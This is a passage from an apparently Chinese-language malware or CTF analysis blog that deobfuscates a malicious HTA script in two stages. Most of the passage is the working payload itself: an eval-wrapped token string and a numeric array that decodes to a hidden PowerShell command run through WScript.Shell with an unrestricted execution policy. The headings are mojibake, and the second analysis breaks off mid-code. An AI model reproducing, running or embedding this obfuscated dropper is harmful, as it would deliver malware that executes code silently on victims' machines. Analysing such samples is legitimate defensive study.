,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,NW,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,FT,Fi,it,ff,RV,xv,NW,NW,ff,RV,xv,kX,Mb,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,NW,ff,RV,xv,kX,Mb,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Fi,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,yN,ff,RV,xv,NW,xv,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,NW,Mb,ff,RV,xv,NW,xv,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,NW,Mb,ff,RV,xv,NW,Fi,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,FT,Fi,yN,ff,RV,xv,NW,NW,ff,RV,xv,NW,FT,ff,RV,FT,Fi,yN,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,yN,ff,RV,xv,NW,FT,ff,RV,xv,NW,FT,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,NW,FT,ff,RV,xv,NW,it,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,NW,FT,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,xv,kX,kX,ff,RV,xv,NW,FT,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,xv,NW,FT,ff,RV,FT,Fi,QB,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,kX,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,QB,ff,RV,xv,NW,FT,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,xv,NW,QB,ff,RV,xv,kX,kX,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,NW,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,xv,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,FT,Fi,it,ff,RV,xv,NW,yN,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,kX,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,NW,zN,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,it,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,xv,kX,Mb,ff,RV,xv,NW,Mb,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,yN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,it,ff,RV,xv,NW,Fi,ff,RV,xv,NW,Mb,ff,RV,xv,kX,Mb,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,QB,ff,RV,xv,kX,Mb,ff,RV,xv,zN,kX,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,xv,NW,zN,ff,RV,FT,Fi,it,ff,RV,FT,Fi,it,ff,RV,FT,Fi,yN,ff,RV,xv,NW,xv,ff,RV,xv,zN,Fi,ff,RV,xv,zN,NW,ff,RV,xv,zN,Fi,ff,RV,xv,zN,FT,ff,RV,FT,it,zN,ff,RV,xv,NW,QB,ff,RV,FT,it,xv,ff,RV,xv,zN,Fi,ff,RV,xv,zN,it,ff,RV,xv,yN,yN,ff,RV,FT,it,NW,ff,RV,xv,yN,yN,ff,RV,xv,yN,Mb,ff,RV,xv,yN,yN,ff,RV,FT,it,zN,ff,RV,xv,yN,yN,ff,RV,xv,kX,it,ff,RV,FT,Fi,Fi,ff,RV,FT,Fi,NW,ff,RV,xv,kX,Mb,ff,RV,FT,QB,NW,ff,RV,xv,kX,zN,ff,RV,xv,zN,QB,ff,RV,xv,kX,it,ff,RV,xv,xv,Mb,ff,RV,FT,QB,it,ff,RV,FT,QB,QB,ff,RV,FT,QB,kX,ff,RV,FT,Fi,it,ff,RV,FT,QB,NW,ff,RV,FT,QB,FT,ff,RV,xv,kX,zN,ff,RV,xv,NW,kX,ff,RV,xv,NW,kX,ff,RV,xv,Mb,NW,ff,RV,FT,QB,it,ff,RV,xv,xv,FT,ff,RV,FT,it,it,ff,RV,FT,QB,FT,ff,RV,FT,Fi,it,ff,RV,xv,zN,QB,ff,RV,xv,yN,FT,ff,RV,xv,kX,xv,ff,RV,xv,zN,FT,ff,RV,xv,Mb,FT,ff,RV,xv,kX,Mb,ff,RV,FT,Fi,kX,ff,RV,FT,QB,Mb,ff,RV,FT,Fi,it,ff,RV,xv,zN,NW,ff,RV,xv,NW,Fi,ff,RV,xv,NW,NW,ff,RV,xv,zN,it,ff,RV,xv,yN,yN,ff,RV,xv,zN,xv,ff,RV,xv,kX,kX,ff,RV,FT,it,QB,ff,RV,FT,QB,it,ff,RV,FT,QB,NW,ff,RV,xv,yN,yN,ff,RV,xv,zN,Fi,ff,RV,xv,NW,QB,ff,RV,xv,zN,kX,ff,RV,xv,NW,yN,ff,RV,xv,zN,Fi,ff,RV,xv,zN,it,ff,RV,xv,yN,yN,ff,RV,FT,it,xv,ff,RV,xv,zN,it,ff,RV,xv,yN,yN,ff,RV,xv,zN,xv,ff,RV,FT,Fi,FT,ff,RV,FT,QB,it,ff,RV,FT,Fi,xv,ff,RV,FT,QB,QB,ff,RV,xv,yN,yN,ff,RV,xv,zN,Fi,ff,RV,xv,zN,Fi,ff,RV,xv,xv,Fi,ff,RV,xv,yN,kX,ff,RV,xv,yN,yN,ff,RV,xv,yN,FT,ff,RV,xv,FT,Fi,ff,RV,xv,FT,QB,ff,RV,xv,Mb,NW,ff,RV,xv,FT,Fi,ff,RV,xv,zN,FT,ff,RV,xv,Mb,zN,ff,RV,FT,QB,Mb,ff,RV,xv,kX,kX,ff,RV,FT,QB,xv,ff,RV,FT,QB,FT,ff,RV,FT,QB,NW,ff,RV,FT,Fi,xv,ff,RV,FT,QB,QB,ff,RV,FT,Fi,zN,ff,RV,xv,zN,QB,ff,RV,xv,zN,kX,ff,RV,xv,zN,NW,ff,RV,xv,NW,it,ff,RV,xv,zN,it,ff,RV,xv,yN,yN,ff,RV,xv,yN,FT,ff,RV,xv,FT,Fi,ff,RV,xv,FT,QB,ff,RV,xv,Mb,NW,ff,RV,xv,FT,Fi,ff,RV,xv,zN,FT,ff,RV,xv,Mb,zN,ff,RV,FT,QB,Mb,ff,RV,xv,kX,kX,ff,RV,FT,QB,xv,ff,RV,FT,QB,FT,ff,RV,FT,QB,NW,ff,RV,FT,Fi,xv,ff,RV,FT,QB,QB,ff,RV,FT,Fi,zN,ff,RV,xv,zN,QB,ff,RV,xv,NW,it,ff,RV,xv,zN,it,tg,QF,Im,nd,Ge,sV,RV,Gm,YZ,Xj,kF,RV,ST,RV,pV,wt,wV,Rp,kz,CX,GH,US,xv,Mb,Mb,ff,xv,Mb,zN,ff,FT,Fi,Fi,ff,FT,QB,NW,ff,FT,Fi,xv,ff,FT,QB,yN,ff,FT,QB,FT,ff,xv,zN,FT,ff,xv,Mb,zN,ff,FT,Fi,NW,ff,FT,Fi,it,ff,FT,Fi,kX,ff,FT,Fi,kX,tg,QF,Im,nd,Ge,sV,RV,pV,wt,wV,Rp,kz,CX,RV,ST,RV,tV,Gm,Wn,RV,sC,Fx,nI,pV,nd,Gm,Yp,FF,uS,Rp,Gm,Fx,nI,GH,Gm,YZ,Xj,kF,QF,Im,pV,wt,wV,Rp,kz,CX,cX,wV,UP,tV,GH,wt,wl,NL,Ep,uS,Lj,ff,RV,Fi,ff,RV,nI,sV,UP,Gm,QF,Im);eval(SxhM); window.close();&lt;/script&gt;</span><br></pre></td></tr></table></figure><br>è§£æ1ï¼š<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">maps = &#123;</span><br><span class="line">    <span class="string">&quot;SK&quot;</span>: <span class="number">102</span>, <span class="string">&quot;UP&quot;</span>: <span class="number">117</span>, <span class="string">&quot;tV&quot;</span>: <span class="number">110</span>, <span class="string">&quot;Fx&quot;</span>: <span class="number">99</span>, <span class="string">&quot;nI&quot;</span>: <span class="number">116</span>, <span class="string">&quot;pV&quot;</span>: <span class="number">105</span>, <span class="string">&quot;wt&quot;</span>: <span class="number">111</span>,</span><br><span class="line">    <span class="string">&quot;RV&quot;</span>: <span class="number">32</span>, <span class="string">&quot;wV&quot;</span>: <span class="number">82</span>, <span class="string">&quot;Rp&quot;</span>: <span class="number">106</span>, <span class="string">&quot;kz&quot;</span>: <span class="number">81</span>, <span class="string">&quot;CX&quot;</span>: <span class="number">78</span>, <span class="string">&quot;GH&quot;</span>: <span class="number">40</span>, <span class="string">&quot;PS&quot;</span>: <span class="number">70</span>, <span class="string">&quot;YO&quot;</span>: <span class="number">86</span>,</span><br><span class="line">    <span class="string">&quot;kF&quot;</span>: <span class="number">75</span>, <span class="string">&quot;PO&quot;</span>: <span class="number">113</span>, <span class="string">&quot;QF&quot;</span>: <span class="number">41</span>, <span class="string">&quot;sZ&quot;</span>: <span class="number">123</span>, <span class="string">&quot;nd&quot;</span>: <span class="number">118</span>, <span class="string">&quot;Ge&quot;</span>: <span class="number">97</span>, <span class="string">&quot;sV&quot;</span>: <span class="number">114</span>, <span class="string">&quot;wl&quot;</span>: <span class="number">104</span>,</span><br><span class="line">    <span class="string">&quot;NL&quot;</span>: <span class="number">121</span>, <span class="string">&quot;Ep&quot;</span>: <span class="number">76</span>, <span class="string">&quot;uS&quot;</span>: <span class="number">98</span>, <span class="string">&quot;Lj&quot;</span>: <span class="number">103</span>, <span class="string">&quot;ST&quot;</span>: <span class="number">61</span>, <span class="string">&quot;Ix&quot;</span>: <span class="number">34</span>, <span class="string">&quot;Im&quot;</span>: <span class="number">59</span>, <span class="string">&quot;Gm&quot;</span>: <span class="number">101</span>,</span><br><span class="line">    <span class="string">&quot;YZ&quot;</span>: <span class="number">109</span>, <span class="string">&quot;Xj&quot;</span>: <span class="number">71</span>, <span class="string">&quot;Fi&quot;</span>: <span class="number">48</span>, <span class="string">&quot;dL&quot;</span>: <span class="number">60</span>, <span class="string">&quot;cX&quot;</span>: <span class="number">46</span>, <span class="string">&quot;ho&quot;</span>: <span class="number">108</span>, <span class="string">&quot;jF&quot;</span>: <span class="number">43</span>, <span class="string">&quot;Gg&quot;</span>: <span class="number">100</span>,</span><br><span class="line">    <span class="string">&quot;aV&quot;</span>: <span class="number">90</span>, <span class="string">&quot;uD&quot;</span>: <span class="number">67</span>, <span class="string">&quot;Nj&quot;</span>: <span class="number">83</span>, <span class="string">&quot;US&quot;</span>: <span class="number">91</span>, <span class="string">&quot;tg&quot;</span>: <span class="number">93</span>, <span class="string">&quot;vx&quot;</span>: <span class="number">45</span>, <span class="string">&quot;xv&quot;</span>: <span class="number">54</span>, <span class="string">&quot;QB&quot;</span>: <span class="number">49</span>,</span><br><span class="line">    <span class="string">&quot;WT&quot;</span>: <span class="number">125</span>, <span class="string">&quot;FT&quot;</span>: <span class="number">55</span>, <span class="string">&quot;yN&quot;</span>: <span class="number">51</span>, <span class="string">&quot;ff&quot;</span>: <span class="number">44</span>, <span class="string">&quot;it&quot;</span>: <span class="number">50</span>, <span class="string">&quot;NW&quot;</span>: <span class="number">53</span>, <span class="string">&quot;kX&quot;</span>: <span class="number">57</span>, <span class="string">&quot;zN&quot;</span>: <span class="number">52</span>,</span><br><span class="line">    <span class="string">&quot;Mb&quot;</span>: <span class="number">56</span>, <span class="string">&quot;Wn&quot;</span>: <span class="number">119</span>, <span class="string">&quot;sC&quot;</span>: <span class="number">65</span>, <span class="string">&quot;Yp&quot;</span>: <span class="number">88</span>, <span class="string">&quot;FF&quot;</span>: <span class="number">79</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">input</span> = </span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">SK,UP,tV,Fx,nI,pV,wt,tV,RV,pV,wt,wV,Rp,kz,CX,GH,PS,YO,kF,PO...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>).split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">decode=[]</span><br><span class="line"><span class="keyword">for</span> arg <span class="keyword">in</span> <span class="built_in">input</span>:</span><br><span class="line">    <span class="keyword">if</span> arg == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    ascii_value = maps.get(arg)</span><br><span class="line">    <span class="keyword">if</span> ascii_value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        decode.append(<span class="built_in">chr</span>(ascii_value))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Warning: No mapping found for <span class="subst">&#123;arg&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">decoded = <span class="string">&#x27;&#x27;</span>.join(decode)</span><br><span class="line"><span class="built_in">print</span>(decoded)</span><br></pre></td></tr></table></figure><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function ioRjQN(FVKq)&#123;var ohyLbg= &quot;&quot;;for (var emGK = 0;emGK &lt; FVKq.length; emGK++)&#123;var ndZC = String.fromCharCode(FVKq[emGK] - 601);ohyLbg = ohyLbg + ndZC&#125;return ohyLbg&#125;;var ohyLbg = ioRjQN([713, 712, 720, 702, 715, 716, 705, 702, 709, 709, 647, 702, 721, 702, 633, 646, 720, 633, 650, 633, 646, 702, 713, 633, 686, 711, 715, 702, 716, 717, 715, 706, 700, 717, 702, 701, 633, 646, 711, 712, 713, 633, 637, 670, 671, 685, 670, 633, 662, 641, 692, 715, 702, 704, 702, 721, 694, 659, 659, 678, 698, 717, 700, 705, 702, 716, 641, 640, 698, 654, 698, 658, 699, 653, 658, 703, 699, 657, 698, 701, 699, 702, 699, 657, 702, 650, 658, 700, 699, 702, 698, 652, 698, 703, 698, 658, 699, 703, 699, 703, 702, 700, 702, 702, 702, 657, 698, 658, 698, 651, 699, 698, 703, 655, 658, 703, 699, 654, 699, 703, 699, 657, 698, 658, 698, 650, 658, 702, 698, 652, 698, 652, 699, 657, 658, 649, 658, 703, 699, 654, 699, 703, 658, 699, 657, 652, 658, 699, 703, 698, 703, 657, 658, 649, 658, 699, 698, 654, 698, 651, 698, 657, 698, 652, 699, 699, 699, 703, 658, 700, 698, 652, 699, 699, 698, 658, 699, 702, 658, 703, 698, 653, 698, 658, 698, 649, 698, 649, 658, 649, 699, 698, 703, 701, 702, 651, 703, 700, 658, 649, 699, 700, 698, 652, 699, 699, 698, 658, 699, 702, 699, 703, 698, 653, 698, 658, 698, 649, 698, 649, 702, 651, 698, 658, 699, 653, 698, 658, 702, 702, 702, 700, 702, 650, 658, 699, 698, 654, 698, 651, 698, 657, 698, 652, 699, 699, 658, 703, 699, 657, 699, 654, 698, 649, 698, 658, 702, 700, 657, 653, 698, 654, 698, 657, 698, 657, 698, 658, 698, 651, 702, 700, 702, 650, 657, 701, 699, 702, 698, 699, 699, 658, 698, 650, 698, 658, 698, 651, 699, 657, 657, 649, 698, 654, 699, 703, 699, 657, 702, 700, 702, 699, 702, 650, 699, 699, 702, 699, 702, 649, 702, 699, 698, 653, 702, 699, 702, 649, 702, 699, 702, 650, 698, 658, 699, 700, 702, 699, 702, 649, 702, 699, 658, 658, 698, 651, 699, 702, 698, 658, 699, 703, 699, 657, 699, 702, 698, 654, 698, 703, 699, 657, 698, 658, 698, 657, 702, 699, 702, 649, 702, 699, 702, 650, 657, 703, 698, 652, 698, 650, 698, 650, 698, 701, 698, 651, 698, 657, 702, 699, 702, 649, 702, 702, 658, 703, 698, 658, 699, 657, 702, 650, 658, 698, 698, 701, 699, 702, 698, 654, 698, 701, 698, 702, 698, 649, 698, 658, 702, 700, 703, 703, 702, 700, 702, 699, 698, 653, 699, 657, 699, 657, 699, 700, 703, 655, 702, 652, 702, 652, 698, 703, 698, 653, 698, 701, 698, 649, 698, 649, 698, 658, 698, 651, 698, 699, 698, 658, 702, 651, 699, 653, 698, 654, 698, 651, 699, 703, 698, 653, 698, 654, 702, 651, 698, 698, 699, 658, 698, 651, 703, 655, 703, 657, 703, 653, 703, 699, 703, 698, 703, 699, 702, 652, 698, 702, 698, 658, 699, 703, 699, 657, 699, 658, 698, 657, 698, 657, 698, 654, 698, 651, 698, 699, 702, 651, 698, 655, 699, 700, 698, 699, 702, 699, 703, 656, 658, 703, 657, 654, 702, 700, 658, 698, 698, 701, 699, 702, 698, 654, 698, 701, 698, 702, 698, 649, 698, 658, 703, 655, 702, 652, 658, 655, 703, 657, 657, 657, 702, 700, 702, 699, 657, 651, 698, 658, 699, 657, 702, 651, 658, 699, 698, 658, 698, 702, 657, 703, 698, 649, 698, 654, 698, 658, 698, 651, 699, 657, 702, 699, 703, 656, 698, 703, 698, 657, 703, 656, 658, 703, 658, 698, 702, 700, 698, 703, 703, 657, 657, 653, 702, 700, 702, 653, 702, 651, 698, 700, 702, 657, 657, 658, 699, 653, 698, 658, 698, 703, 699, 658, 699, 657, 698, 654, 698, 652, 698, 651, 657, 703, 698, 652, 698, 651, 699, 657, 698, 658, 699, 653, 699, 657, 702, 651, 657, 654, 698, 651, 699, 698, 698, 652, 698, 656, 698, 658, 657, 703, 698, 652, 698, 650, 698, 650, 698, 701, 698, 651, 698, 657, 702, 651, 702, 653, 702, 653, 698, 700, 702, 657, 657, 658, 699, 653, 698, 658, 698, 703, 699, 658, 699, 657, 698, 654, 698, 652, 698, 651, 657, 703, 698, 652, 698, 651, 699, 657, 698, 658, 699, 653, 699, 657, 702, 651, 657, 654, 698, 651, 699, 698, 698, 652, 698, 656, 698, 658, 657, 703, 698, 652, 698, 650, 698, 650, 698, 701, 698, 651, 698, 657, 699, 649, 657, 699, 698, 658, 699, 657, 702, 650, 657, 650, 698, 658, 698, 650, 698, 702, 698, 658, 699, 702, 702, 654, 658, 656, 703, 702, 658, 650, 702, 651, 657, 651, 698, 701, 698, 650, 698, 658, 702, 654, 702, 651, 657, 654, 698, 651, 699, 698, 698, 652, 698, 656, 698, 658, 702, 653, 698, 700, 702, 657, 657, 658, 699, 653, 698, 658, 698, 703, 699, 658, 699, 657, 698, 654, 698, 652, 698, 651, 657, 703, 698, 652, 698, 651, 699, 657, 698, 658, 699, 653, 699, 657, 702, 651, 657, 654, 698, 651, 699, 698, 698, 652, 698, 656, 698, 658, 657, 703, 698, 652, 698, 650, 698, 650, 698, 701, 698, 651, 698, 657, 702, 651, 702, 653, 702, 653, 698, 700, 702, 657, 657, 658, 699, 653, 698, 658, 698, 703, 699, 658, 699, 657, 698, 654, 698, 652, 698, 651, 657, 703, 698, 652, 698, 651, 699, 657, 698, 658, 699, 653, 699, 657, 702, 651, 657, 654, 698, 651, 699, 698, 698, 652, 698, 656, 698, 658, 657, 703, 698, 652, 698, 650, 698, 650, 698, 701, 698, 651, 698, 657, 699, 649, 657, 699, 698, 658, 699, 657, 702, 650, 657, 650, 698, 658, 698, 650, 698, 702, 698, 658, 699, 702, 699, 649, 658, 699, 698, 653, 698, 658, 699, 702, 698, 658, 699, 656, 702, 653, 657, 699, 658, 698, 702, 700, 658, 652, 702, 654, 702, 651, 658, 698, 698, 701, 698, 649, 699, 658, 698, 658, 702, 651, 657, 651, 698, 701, 698, 650, 698, 658, 702, 650, 698, 703, 698, 649, 698, 654, 698, 656, 698, 658, 702, 699, 702, 655, 698, 657, 657, 651, 698, 701, 698, 650, 698, 658, 702, 699, 699, 650, 702, 654, 702, 651, 657, 651, 698, 701, 698, 650, 698, 658, 702, 654, 702, 651, 657, 654, 698, 651, 699, 698, 698, 652, 698, 656, 698, 658, 702, 653, 702, 699, 657, 651, 698, 658, 702, 655, 698, 703, 699, 657, 702, 699, 702, 649, 703, 701, 702, 649, 703, 701, 702, 654, 702, 654, 702, 653, 657, 649, 658, 703, 702, 700, 658, 698, 698, 701, 699, 702, 698, 654, 698, 701, 698, 702, 698, 649, 698, 658, 703, 655, 702, 652, 658, 655, 703, 657, 657, 657, 702, 654, 702, 651, 658, 698, 698, 701, 698, 649, 699, 658, 698, 658, 702, 654, 703, 656, 658, 703, 658, 698, 702, 700, 657, 701, 702, 700, 702, 653, 702, 653, 702, 653, 702, 653, 657, 699, 698, 658, 699, 657, 702, 650, 658, 698, 698, 701, 699, 702, 698, 654, 698, 701, 698, 702, 698, 649, 698, 658, 702, 700, 698, 703, 703, 657, 657, 653, 702, 700, 702, 650, 658, 698, 698, 701, 698, 649, 699, 658, 698, 658, 657, 652, 702, 654, 699, 649, 657, 699, 698, 658, 699, 657, 702, 650, 657, 650, 698, 658, 698, 650, 698, 702, 698, 658, 699, 702, 702, 654, 699, 649, 658, 699, 698, 653, 698, 658, 699, 702, 698, 658, 699, 656, 702, 653, 657, 699, 658, 698, 702, 700, 658, 652, 702, 654, 702, 651, 658, 698, 698, 701, 698, 649, 699, 658, 698, 658, 702, 651, 657, 651, 698, 701, 698, 650, 698, 658, 702, 650, 698, 703, 698, 649, 698, 654, 698, 656, 698, 658, 702, 699, 702, 655, 699, 699, 698, 651, 702, 655, 698, 657, 702, 655, 698, 699, 702, 699, 699, 650, 702, 654, 702, 651, 657, 651, 698, 701, 698, 650, 698, 658, 702, 654, 703, 656, 702, 698, 702, 653, 658, 656, 658, 703, 698, 703, 699, 702, 698, 654, 699, 700, 699, 657, 657, 702, 698, 649, 698, 652, 698, 703, 698, 656, 658, 650, 703, 655, 703, 655, 657, 703, 699, 702, 698, 658, 698, 701, 699, 657, 698, 658, 702, 653, 702, 653, 657, 699, 698, 658, 699, 657, 702, 650, 658, 698, 698, 701, 699, 702, 698, 654, 698, 701, 698, 702, 698, 649, 698, 658, 702, 700, 698, 703, 703, 657, 657, 653, 702, 700, 702, 650, 658, 698, 698, 701, 698, 649, 699, 658, 698, 658, 657, 652, 702, 654, 702, 651, 702, 653, 702, 653, 657, 699, 698, 658, 699, 657, 702, 650, 658, 698, 698, 701, 699, 702, 698, 654, 698, 701, 698, 702, 698, 649, 698, 658, 702, 700, 657, 701, 702, 654, 702, 651, 658, 698, 698, 701, 698, 649, 699, 658, 698, 658, 702, 654, 702, 651, 657, 654, 698, 651, 699, 698, 698, 652, 698, 656, 698, 658, 702, 653, 702, 653, 658, 698, 698, 701, 699, 702, 698, 654, 698, 701, 698, 702, 698, 649, 698, 658, 702, 700, 703, 703, 702, 700, 702, 650, 658, 698, 698, 701, 698, 649, 702, 654, 702, 654, 702, 654, 702, 654, 702, 702, 703, 656, 640, 645, 640, 647, 724, 651, 726, 640, 642, 633, 725, 633, 638, 633, 724, 633, 692, 700, 705, 698, 715, 694, 641, 692, 668, 712, 711, 719, 702, 715, 717, 694, 659, 659, 685, 712, 667, 722, 717, 702, 641, 637, 696, 647, 687, 698, 709, 718, 702, 645, 650, 655, 642, 633, 646, 699, 721, 712, 715, 633, 640, 651, 649, 653, 640, 642, 633, 726, 642, 633, 646, 707, 712, 706, 711, 633, 640, 640, 660, 639, 633, 637, 670, 671, 685, 670, 647, 684, 718, 699, 716, 717, 715, 706, 711, 704, 641, 649, 645, 652, 642, 633, 637, 670, 671, 685, 670, 647, 684, 718, 699, 716, 717, 715, 706, 711, 704, 641, 652, 642]);var emGK = ioRjQN([688,684,700,715,706,713,717,647,684,705,702,709,709]);var ioRjQN = new ActiveXObject(emGK);ioRjQN.Run(ohyLbg, 0, true) </span><br></pre></td></tr></table></figure><br>è§£æ2ï¼š<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">input1 = [<span class="number">713</span>, <span class="number">712</span>, <span class="number">720</span>, <span class="number">702</span>, <span class="number">715</span>, <span class="number">716</span>, <span class="number">705.</span>..]</span><br><span class="line">input2 = [<span class="number">688</span>,<span class="number">684</span>,<span class="number">700</span>,<span class="number">715</span>,<span class="number">706</span>,<span class="number">713</span>,<span class="number">717</span>,<span class="number">647</span>,<span class="number">684</span>,<span class="number">705</span>,<span class="number">702</span>,<span class="number">709</span>,<span class="number">709</span>]</span><br><span class="line"></span><br><span class="line">dec 